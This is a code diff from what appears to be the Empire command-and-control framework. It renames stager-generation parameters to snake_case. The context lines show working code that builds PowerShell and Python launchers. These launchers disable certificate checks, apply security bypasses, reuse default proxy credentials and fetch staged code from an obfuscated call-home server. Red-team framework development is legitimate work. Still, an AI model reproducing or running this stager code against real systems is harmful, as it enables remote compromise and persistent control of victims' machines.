@@ -86,13 +86,13 @@ class Listener:
         encode=True,
         obfuscate=False,
         obfuscation_command="",
-        userAgent="default",
+        user_agent="default",
         proxy="default",
-        proxyCreds="default",
-        stagerRetries="0",
+        proxy_creds="default",
+        stager_retries="0",
         language=None,
-        safeChecks="",
-        listenerName=None,
+        safe_checks="",
+        listener_name=None,
         bypasses: list[str] = None,
     ):
         """
@@ -120,7 +120,7 @@ class Listener:
             # PowerShell
 
             stager = '$ErrorActionPreference = "SilentlyContinue";'
-            if safeChecks.lower() == "true":
+            if safe_checks.lower() == "true":
                 stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
 
                 for bypass in bypasses:
@@ -129,17 +129,17 @@ class Listener:
 
             stager += "$wc=New-Object System.Net.WebClient;"
 
-            if userAgent.lower() == "default":
+            if user_agent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
-                userAgent = profile.split("|")[1]
-            stager += f"$u='{ userAgent }';"
+                user_agent = profile.split("|")[1]
+            stager += f"$u='{ user_agent }';"
 
             if "https" in host:
                 # allow for self-signed certificates for https connections
                 stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
-            if userAgent.lower() != "none" or proxy.lower() != "none":
-                if userAgent.lower() != "none":
+            if user_agent.lower() != "none" or proxy.lower() != "none":
+                if user_agent.lower() != "none":
                     stager += "$wc.Headers.Add('User-Agent',$u);"
 
                 if proxy.lower() != "none":
@@ -153,13 +153,13 @@ class Listener:
                         )
                         stager += "$wc.Proxy = $proxy;"
 
-                    if proxyCreds.lower() == "default":
+                    if proxy_creds.lower() == "default":
                         stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
 
                     else:
                         # TODO: implement form for other proxy credentials
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         if len(username.split("\\")) > 1:
                             usr = username.split("\\")[1]
                             domain = username.split("\\")[0]
@@ -204,7 +204,7 @@ class Listener:
             b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")
 
             # stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
-            stager += f"$ser={helpers.obfuscate_call_home_address(host)};$t='{stage0}';$hop='{listenerName}';"
+            stager += f"$ser={helpers.obfuscate_call_home_address(host)};$t='{stage0}';$hop='{listener_name}';"
 
             # Add custom headers if any
             if customHeaders != []:
@@ -256,18 +256,18 @@ class Listener:
                 launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
 
             try:
-                if safeChecks.lower() == "true":
+                if safe_checks.lower() == "true":
                     launcherBase += listener_util.python_safe_checks()
             except Exception as e:
-                p = f"{listenerName}: Error setting LittleSnitch in stager: {str(e)}"
+                p = f"{listener_name}: Error setting LittleSnitch in stager: {str(e)}"
                 log.error(p, exc_info=True)
 
-            if userAgent.lower() == "default":
+            if user_agent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
-                userAgent = profile.split("|")[1]
+                user_agent = profile.split("|")[1]
 
             launcherBase += "import urllib.request;\n"
-            launcherBase += "UA='%s';" % (userAgent)
+            launcherBase += "UA='%s';" % (user_agent)
             launcherBase += f"server='{host}';t='{stage0}';"
 
             # prebuild the request routing packet for the launcher
@@ -309,13 +309,13 @@ class Listener:
                         + "'});\n"
                     )
 
-                if proxyCreds != "none":
-                    if proxyCreds == "default":
+                if proxy_creds != "none":
+                    if proxy_creds == "default":
                         launcherBase += "o = urllib.request.build_opener(proxy);\n"
                     else:
                         launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         launcherBase += (
                             "proxy_auth_handler.add_password(None,'"
                             + proxy
@@ -383,7 +383,7 @@ class Listener:
             compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
             if not compiler.status == "ON":
                 self.instance_log.error(
-                    f"{listenerName} csharpserver plugin not running"
+                    f"{listener_name} csharpserver plugin not running"
                 )
             else:
                 file_name = compiler.do_send_stager(
